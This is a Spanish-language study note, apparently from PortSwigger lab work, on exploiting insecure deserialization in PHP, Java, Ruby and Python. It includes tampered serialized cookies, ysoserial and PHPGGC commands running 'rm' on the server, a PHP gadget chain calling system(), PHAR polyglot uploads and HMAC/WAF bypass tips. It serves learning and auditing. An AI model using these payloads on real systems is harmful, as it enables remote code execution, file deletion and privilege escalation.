
---
Tags: #insecure-deserialization #php-object-injection #java-deserialization #ruby-marshal #python-pickle #ysoserial #phpggc #gadget-chains #magic-methods #phar-deserialization #type-juggling #object-tampering #custom-gadgets #rce-deserialization #polyglot-phar #marshal-dump #readObject #unserialize #pop-chain

---
## Índice de Contenidos

[[#Tabla de Herramientas de Deserialización]]
	
[[#Concepto Clave: Deserialización Insegura]]
	
[[#Técnica 1: Modificación de Atributos de Objetos (Privilege Escalation)]]
	
[[#Técnica 2: Modificación de Tipos de Datos (Type Juggling Bypass)]]
	
[[#Técnica 3: Abuso de Lógica de Aplicación (Arbitrary File Deletion)]]
	
[[#Técnica 4: Inyección de Objetos Arbitrarios en PHP (Magic Methods)]]
	
[[#Técnica 5: Deserialización Java (Apache Commons & ysoserial)]] 
	
[[#Técnica 6: Deserialización PHP con Gadgets Predefinidos (PHPGGC)]] 
	
[[#Técnica 7: Deserialización en Ruby (Marshal & Gadgets Documentados)]] 
	
[[#Técnica 8: Cadenas Personalizadas (Custom Gadget Chains)]] 
	
[[#Técnica 9: Ataques PHAR (Polyglots)]]
	
[[#📑 Cheat Sheet Deserialización Ofensiva]]
	[[#🚀 Comandos de Generación Rápida]]
		[[#☕ Java (ysoserial)]]
		[[#🐘 PHP (PHPGGC)]]
		[[#💎 Ruby (Marshal)]]
	[[#⚠️ Funciones Peligrosas (Vectores de Ataque)]]
		[[#🐘 PHP]]
		[[#☕ Java]]
		[[#🐍 Python]]
		[[#💎 Ruby]]
	[[#🛠️ Estructura de un Objeto PHP (Para Manual Tampering)]]
	[[#💡 Tips de Pentester Pro]]
	
[[#Referencias]]

---

### Tabla de Herramientas de Deserialización

Aquí tienes la tabla resumen de las herramientas que mencionas en tus apuntes. Es fundamental tenerlas categorizadas para saber qué "arma" sacar según la tecnología que detectes.

|**Lenguaje**|**Herramienta**|**Descripción y Uso en Explotación**|**Comando Típico (Ejemplo)**|
|---|---|---|---|
|**Java**|**ysoserial**|**El estándar de oro para Java.** Genera payloads (cadenas serializadas) que abusan de librerías comunes (como Apache Commons, Spring, Hibernate) presentes en el _classpath_ de la víctima.|`java -jar ysoserial-all.jar CommonsCollections2 'comando'`|
|**PHP**|**PHPGGC**|**PHP Generic Gadget Chains.** Similar a ysoserial pero para PHP. Genera cadenas de gadgets para frameworks populares como Laravel, Symfony, SwiftMailer, etc.|`./phpggc Symfony/RCE4 exec 'comando'`|
|**PHP**|**phar_jpg_polyglot**|**Polyglot Generator.** Crea un archivo que es válido como imagen (JPG) y como archivo PHAR (PHP Archive) simultáneamente. Se usa para evadir filtros de subida de archivos y lograr deserialización vía `phar://`.|_Script personalizado en Python/PHP_|
|**Ruby**|**Universal RCE Gadget**|No es una herramienta "per se" (binary), sino scripts en Ruby que utilizan gadgets documentados para versiones 2.x-3.x (usando `Gem::Installer` o `Net::BufferedIO`).|`ruby payload_generator.rb`|

---

### Concepto Clave: Deserialización Insegura

> [!INFO] **Definición**
> 
> La **serialización** es el proceso de convertir un objeto (con su estado y atributos) en un formato de datos (binario, texto, JSON, XML) para almacenarlo o transmitirlo.
> 
> La **deserialización** es el proceso inverso: reconstruir el objeto a partir de esos datos.
> 
> La vulnerabilidad surge cuando la aplicación **confía ciegamente** en los datos serializados que provienen del usuario. Si un atacante manipula estos datos, puede controlar el estado de los objetos en memoria o, peor aún, el flujo de ejecución del programa.

---

### Técnica 1: Modificación de Atributos de Objetos (Privilege Escalation)

Esta es la forma más básica de explotación. No inyectamos código nuevo, simplemente alteramos el **estado** de un objeto legítimo para beneficiarnos.

**Escenario:**

Una cookie de sesión contiene un objeto serializado en PHP codificado en Base64. El servidor deserializa este objeto para saber quién eres.

**Detección y Explotación:**

1. **Identificación:** Vemos una cookie sospechosa (`Tzo0...`) que al decodificar revela estructura PHP (`O:4:"User"...`).
    
2. **Análisis:**
    
    - Original: `O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}`
        
    - Vemos `s:5:"admin";b:0;`. La `b` indica un booleano y `0` es `false`.
        
3. **Ataque (PoC):**
    
    - Cambiamos el valor a `1` (true).
        
    - Payload: `O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}`
        
    - Recodificamos a Base64 y actualizamos la cookie.
        

> [!TIP] **Nota Técnica**
> 
> Al modificar la longitud de los strings (por ejemplo, si cambias "wiener" por "administrator"), **siempre** debes actualizar el indicador de longitud (`s:6` a `s:13`). En este caso, como solo cambiamos un booleano, la estructura de longitud se mantiene igual.

---

### Técnica 2: Modificación de Tipos de Datos (Type Juggling Bypass)

PHP es conocido por sus comparaciones "flexibles" (Loose comparisons `==` vs Strict `===`). Podemos abusar de esto cambiando el **tipo de dato** en el objeto serializado.

**El Problema:**

El código PHP podría estar haciendo algo como: `if ($user->access_token == $real_token) { ... }`.

En PHP: `0 == "string"` o `true == "cualquier_string_no_vacio"` a menudo se evalúa como verdadero.

**Detección y Explotación:**

1. **Análisis:**
    
    - Original: `...s:12:"access_token";s:32:"asdfghjkloiuytrewqaserftgyhuji";...`
        
    - Tenemos un token complejo que no conocemos.
        
2. **Ataque (PoC):**
    
    - En lugar de adivinar el token, cambiamos su **tipo** de String (`s`) a Booleano (`b`).
        
    - Payload: `...s:12:"access_token";b:1;...`
        
    - Al deserializarse, el objeto tendrá `access_token = true`.
        
    - Si la comparación es débil, `true == "token_secreto"` dará acceso concedido.
        

---

### Técnica 3: Abuso de Lógica de Aplicación (Arbitrary File Deletion)

Aquí no explotamos el lenguaje PHP en sí, sino **qué hace el programador** con los datos del objeto.

**Escenario:**

La aplicación tiene una función "Borrar cuenta" que también borra la imagen de perfil del usuario. La ruta de la imagen está guardada... ¡en la cookie serializada!

**Explotación:**

1. **Análisis:**
    
    - Cookie: `...s:11:"avatar_link";s:18:"user/gregg/avatar";}`
        
    - Al borrar la cuenta, el backend probablemente hace `unlink($this->avatar_link)`.
        
2. **Ataque (PoC):**
    
    - Apuntamos `avatar_link` a un archivo que queremos destruir.
        
    - Payload: `...s:11:"avatar_link";s:10:"morale.txt";}` (No olvides actualizar la longitud de `s:18` a `s:10`).
        
    - Enviamos la petición de borrar cuenta. El servidor borra la cuenta Y el archivo `morale.txt`.
        

---

### Técnica 4: Inyección de Objetos Arbitrarios en PHP (Magic Methods)

Esta técnica es más avanzada. No modificamos un objeto existente (`User`), sino que **inyectamos un objeto de una clase totalmente diferente** (`CustomTemplate`) que existe en el código fuente pero que no se esperaba en ese contexto.

#### El descubrimiento del código fuente (La extensión `~`)

Mencionas que encontraste `/libs/CustomTemplate.php~`.

> [!QUESTION] **¿Por qué la virgulilla (~)?**
> 
> La virgulilla (`~`) al final de un nombre de archivo es una convención común utilizada por editores de texto en sistemas Linux/Unix (como **Vim**, **Emacs** o **Nano**) para guardar **archivos de respaldo temporales** (backup files).
> 
> - **El Riesgo:** El servidor web (Apache/Nginx) está configurado para ejecutar archivos `.php` como código. Sin embargo, a menudo **no sabe qué hacer con `.php~`**, por lo que trata el archivo como texto plano y **te lo descarga o muestra el código fuente** en lugar de ejecutarlo.
>     
> - **Otras extensiones peligrosas:** `.php.bak`, `.php.old`, `.php.save`, `.swp` (Vim swap file), `.tmp`.
>     

#### Análisis del Gadget (`CustomTemplate`)

El código filtrado revela un "Magic Method" peligroso: `__destruct()`.

```PHP
function __destruct() {
    // Si existe el archivo de bloqueo, lo borra.
    if (file_exists($this->lock_file_path)) {
        unlink($this->lock_file_path);
    }
}
```

- **Gadget:** Un trozo de código existente que podemos reutilizar para fines maliciosos.
    
- **Trigger:** `__destruct()` se ejecuta automáticamente cuando el objeto ya no es necesario (al finalizar el script PHP).
    
- **Vulnerabilidad:** La variable `$lock_file_path` se define en el constructor, pero al inyectar el objeto serializado, podemos sobrescribir directamente sus atributos sin pasar por el constructor.
    

#### Explotación (PoC)

1. **Objetivo:** Borrar `/home/carlos/morale.txt`.
    
2. **Construcción del Objeto:**
    
    Creamos un objeto `CustomTemplate` donde `lock_file_path` apunte al archivo objetivo.
    
1. **Payload Serializado:**
    
    ```
    O:14:"customTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
    ```
    
2. **Ejecución:**
    
    Codificamos en Base64 -> Enviamos en Cookie -> El script termina -> Se ejecuta `__destruct()` -> `unlink('/home/carlos/morale.txt')`.
---

### Técnica 5: Deserialización Java (Apache Commons & ysoserial)

Java es históricamente uno de los lenguajes más afectados por la deserialización insegura debido al uso masivo de librerías comunes (como _Apache Commons Collections_) que contienen clases peligrosas si se encadenan correctamente.

**Herramienta Clave: `ysoserial`**

Es un generador de payloads. No explota la vulnerabilidad por sí mismo, sino que crea el objeto serializado malicioso que la aplicación víctima aceptará.

**Pasos de Explotación (Tu ejemplo):**

1. **Preparación del entorno:**
    
    Asegúrate de usar la versión de Java correcta. Las cadenas de gadgets suelen depender de versiones específicas del JDK.
    
    `sudo update-alternatives --config java` (Seleccionar Java 11 en este caso).
    
2. **Selección del Gadget:**
    
    Usamos `CommonsCollections2`. ¿Por qué? Porque `ysoserial` tiene diferentes cadenas para diferentes versiones de la librería _Commons Collections_. Si una no funciona, se prueban las variantes (1-7).
    
1. **Generación del Payload:**
    
    ```Bash
    java -jar ysoserial-all.jar CommonsCollections2 'rm /home/carlos/morale.txt' | base64 -w 0; echo
    ```
    
    - **El comando:** `rm /home/carlos/morale.txt` es lo que queremos ejecutar en el servidor.
        
    - **Pipe `|`:** Redirige la salida binaria del payload.
        
    - **`base64 -w 0`:** Convierte el binario a texto Base64.
        
        - **¡Importante!** El flag `-w 0` (write 0) deshabilita el salto de línea. Sin esto, el comando `base64` corta líneas cada 76 caracteres, lo que **corrompería la cookie** y rompería el ataque.
            
2. **Inyección:**
    
    Pegamos el Base64 resultante en la cookie `session` y recargamos. El servidor deserializa el objeto y ejecuta el comando.
    

---

### Técnica 6: Deserialización PHP con Gadgets Predefinidos (PHPGGC)

Al igual que en Java, en PHP los frameworks modernos (Laravel, Symfony, etc.) tienen clases que pueden ser abusadas. **PHPGGC** (PHP Generic Gadget Chains) es el equivalente a `ysoserial` para PHP.

**Reconocimiento:**

1. **Detectar Framework:** Forzando errores o leyendo `phpinfo()`, descubriste **Symfony 4.3.6**.
    
2. **Detectar Firma:** La cookie tiene dos partes: `token` (el objeto) y `sig_hmac_sha1` (la firma).
    
    - _Nota Crítica:_ Si la aplicación verifica la firma, necesitas conocer la **clave secreta** (a veces filtrada en `phpinfo` o archivos de configuración) para firmar tu payload malicioso. Si no firmas el nuevo payload, el servidor lo rechazará.
        

**Pasos de Explotación:**

1. **Listar Gadgets:** `./phpggc -l` muestra qué frameworks soporta.
    
2. **Generar Payload:**
    
    ```Bash
    ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0; echo
    ```
    
    - **`Symfony/RCE4`:** Es la cadena específica para esa versión de Symfony.
        
    - **`exec`:** Indica que queremos ejecutar un comando del sistema.
        
3. **Inyección y Firmado:**
    
    - Colocas el payload generado en el campo `token` de la cookie (JSON).
        
    - **Paso Extra:** Debes generar el nuevo hash HMAC-SHA1 de tu payload usando la clave secreta encontrada y actualizar el campo `sig_hmac_sha1`.
        
    - **URL Encode:** Codifica los caracteres especiales (`+`, `=`, `/`) para evitar errores HTTP.
        

---

### Técnica 7: Deserialización en Ruby (Marshal & Gadgets Documentados)

Ruby utiliza la librería `Marshal` para serializar. Los payloads aquí suelen basarse en manipular el cargador de gemas (`Gem::Installer`).

**Análisis del Script (Tu ejemplo `ruby2x_3x.rb`):**

Este script no es magia, es una construcción cuidadosa de objetos:

1. **Gadget Chain:**
    
    - Empieza con `Gem::Requirement`.
        
    - Pasa por `Gem::Package::TarReader`.
        
    - Llega a `Net::BufferedIO`.
        
    - Finalmente utiliza `Gem::RequestSet` para invocar `Kernel.system`.
        
2. **El Payload:**
    
    El comando `rm /home/carlos/morale.txt` se inyecta en la propiedad `git_set`.
    
1. **Generación y Codificación:**
    
    ```Ruby
    # Convierte el objeto a formato binario Marshal
    dump = Marshal.dump(obj)
    # Codifica en Base64 estricto (sin saltos de línea)
    print Base64.strict_encode64(dump)
    ```
    

**Resultado:**

Obtienes una cadena Base64 que empieza típicamente con `BAh` (firma de Ruby Marshal en Base64). Al reemplazarla en la cookie, el servidor reconstruye estos objetos y detona el comando al intentar resolver dependencias de gemas falsas.

---

### Técnica 8: Cadenas Personalizadas (Custom Gadget Chains)

Aquí es donde demuestras tu verdadera habilidad: analizando código fuente inédito para encontrar vulnerabilidades.

#### A. Java: Inyección SQL vía Deserialización

Este es un caso raro pero poderoso. No conseguimos ejecución de comandos (RCE), sino inyección SQL.

**Análisis del Código (`ProductTemplate.java`):**

1. **Punto de Entrada:** `readObject()`. Este método se ejecuta automáticamente al deserializar.
    
2. **El Pecado:**
    
    ```Java
    String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
    ```
    
    Toma el atributo `id` del objeto y lo mete directamente en la SQL.
    
3. **Ataque (SQLi Error-Based):**
    
    Como no vemos el resultado de la query en la web, forzamos un error de base de datos que contenga la información que queremos.
    
    - **Payload SQL:** `' AND 1=CAST((SELECT username... FROM users...) AS INTEGER)--`
        
    - PostgreSQL intentará convertir el texto "administrator-password" a un número entero. Fallará y dirá: _"ERROR: invalid input syntax for integer: "administrator-password"_. ¡Bingo!
        

#### B. PHP: RCE vía "Magic Methods"

**Concepto de la Cadena:**

`CustomTemplate` (Entrada) $\rightarrow$ `Product` (Trigger) $\rightarrow$ `DefaultMap` (Ejecución).

1. **`CustomTemplate::__wakeup()`:** Prepara el terreno.
    
2. **`Product`:** Intenta acceder a una propiedad que **no existe** en el objeto `DefaultMap`.
    
3. **`DefaultMap::__get()`:** En PHP, si intentas leer una propiedad inexistente, salta el método mágico `__get()`.
    
    ```PHP
    public function __get($name) {
        call_user_func($this->callback, $name);
    }
    ```
    
    - Controlamos `$this->callback` (ponemos `system` o `exec`).
        
    - Controlamos `$name` (ponemos el comando `rm ...`).
        

**Importante sobre la codificación:**

En tu script PHP de generación:

```PHP
$serialized = serialize($payload);
$base64 = base64_encode($serialized);
```

Es vital usar **Base64** antes de enviar. La serialización de objetos `private` en PHP introduce **bytes nulos** (`\0`) alrededor del nombre de la clase y la variable. Si copias y pegas el string crudo, esos bytes nulos se pierden y el exploit falla.

---

### Técnica 9: Ataques PHAR (Polyglots)

Esta es una técnica de **bypass de subida de archivos**.

> [!INFO] **¿Qué es PHAR?**
> 
> Un archivo `.phar` (PHP Archive) es como un `.zip` para aplicaciones PHP. Pero tiene una característica peligrosa: contiene metadatos serializados.
> 
> Si haces cualquier operación de sistema de archivos (como `file_exists`, `fopen`, `getimagesize`) sobre una ruta que empiece por `phar://...`, PHP **deserializará automáticamente** los metadatos.

**El Desafío:**

El servidor solo permite subir imágenes (`.jpg`).

**La Solución: Polyglot JPG-PHAR**

Usaste `phar_jpg_polyglot`. Esta herramienta crea un archivo quimera:

1. **Cabecera:** Son bytes válidos de una imagen JPG (`FF D8 FF...`). Así pasamos el filtro de subida.
    
2. **Cuerpo:** Contiene el payload PHAR oculto en los metadatos de la imagen.
    

**Ejecución:**

1. Subes `avatar.jpg` (que en realidad es el exploit).
    
2. La web no lo ejecuta porque es un JPG.
    
3. **El Disparador:** Fuerzas a la aplicación a leer ese archivo usando el wrapper `phar://`.
    
    - URL: `.../avatar.php?avatar=phar://wiener` (asumiendo que `wiener` es la ruta local donde se subió).
        
4. PHP lee el archivo, encuentra los metadatos serializados, los deserializa y ¡Boom! RCE a través de los gadgets de Twig que inyectaste.


---

# 📑 Cheat Sheet: Deserialización Ofensiva

## 🚀 Comandos de Generación Rápida

### ☕ Java (ysoserial)

|**Escenario**|**Comando**|
|---|---|
|**Básico (Base64)**|`java -jar ysoserial-all.jar [Gadget] '[CMD]' \| base64 -w 0`|
|**Listar Gadgets**|`java -jar ysoserial-all.jar 2>&1 \| grep -A 50 "Available payload"`|
|**Payloads comunes**|`CommonsCollections1-7`, `CommonsBeanutils1`, `Spring1`, `JSON1`|

### 🐘 PHP (PHPGGC)

|**Escenario**|**Comando**|
|---|---|
|**Básico (Base64)**|`./phpggc [Gadget] exec '[CMD]' \| base64 -w 0`|
|**Con Firma (HMAC)**|`./phpggc -s -k [KEY] [Gadget] exec '[CMD]'`|
|**Listar Gadgets**|`./phpggc -l`|
|**Payloads comunes**|`Laravel/RCE1-16`, `Symfony/RCE1-4`, `Guzzle/RCE1`|

### 💎 Ruby (Marshal)

|**Escenario**|**Comando (One-liner)**|
|---|---|
|**Marshal a B64**|`ruby -e 'require "base64"; puts Base64.strict_encode64(Marshal.dump(obj))'`|
|**Firma común**|Los payloads suelen empezar por `BAh` (Base64 de `\x04\x08`).|

---

## ⚠️ Funciones Peligrosas (Vectores de Ataque)

Estas son las funciones que, si reciben datos del usuario, deben ser auditadas inmediatamente.

### 🐘 PHP

- **Puntos de Entrada:** `unserialize()`, `yaml_parse()`.
    
- **Ataque PHAR:** `file_exists()`, `file_get_contents()`, `include()`, `fopen()`, `getimagesize()`.
    
- **Métodos Mágicos (Triggers):**
    
    - `__wakeup()`: Se ejecuta al deserializar.
        
    - `__destruct()`: Se ejecuta al destruir el objeto.
        
    - `__toString()`: Se ejecuta si el objeto se usa como string.
        
    - `__call()` / `__get()`: Se ejecutan al llamar a métodos/propiedades inexistentes.
        

### ☕ Java

- **Clases Críticas:** `ObjectInputStream.readObject()`, `XMLDecoder.readObject()`.
    
- **Librerías Expuestas:** Jackson (`ObjectMapper.readValue`), Fastjson, GSON (si se configuran mal).
    
- **Identificador:** Los archivos serializados de Java empiezan por los bytes `AC ED 00 05` (Base64: `rO0AB`).
    

### 🐍 Python

- **Librería Principal:** `pickle.loads()`.
    
- **Alternativas:** `cPickle.loads()`, `shelve.open()`, `yaml.load()` (sin `SafeLoader`).
    
- **Método Trigger:** `__reduce__()`.
    

### 💎 Ruby

- **Librería Principal:** `Marshal.load()`.
    
- **Otras:** `YAML.load()` (versiones antiguas), `Oj.load()`.
    

---

## 🛠️ Estructura de un Objeto PHP (Para Manual Tampering)

Si necesitas editar un objeto a mano sin herramientas:

`O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}`

1. **`O:4:"User"`**: **O**bjeto de clase "User" (4 caracteres).
    
2. **`:2:`**: El objeto tiene **2** propiedades.
    
3. **`s:8:"username"`**: Primera propiedad es un **s**tring de 8 chars.
    
4. **`s:6:"wiener"`**: Su valor es un **s**tring de 6 chars.
    
5. **`b:0`**: Segunda propiedad es un **b**ooleano con valor **0** (false).
    

---

## 💡 Tips de Pentester Pro

- **Identificación por Firmas:**
    
    - `rO0...` $\rightarrow$ Java
        
    - `Tzo...` $\rightarrow$ PHP
        
    - `BAh...` $\rightarrow$ Ruby Marshal
        
    - `gAS...` $\rightarrow$ Python Pickle
        
- **Bypass de WAF:** Si el WAF bloquea `unserialize()`, prueba a usar **PHAR** subiendo un polyglot; muchos WAFs no analizan los metadatos dentro de una imagen.
    
- **Type Juggling:** Si el exploit falla por una firma HMAC que no tienes, intenta cambiar el tipo de dato de la firma a un booleano `true` (`b:1`) o un entero `0`. A veces el servidor compara `hash_hmac == $user_signature` y un `0` o `true` puede dar un bypass por comparaciones débiles.

---
# Referencias
- Portswigger:[Enlace](https://portswigger.net/web-security/deserialization/exploiting)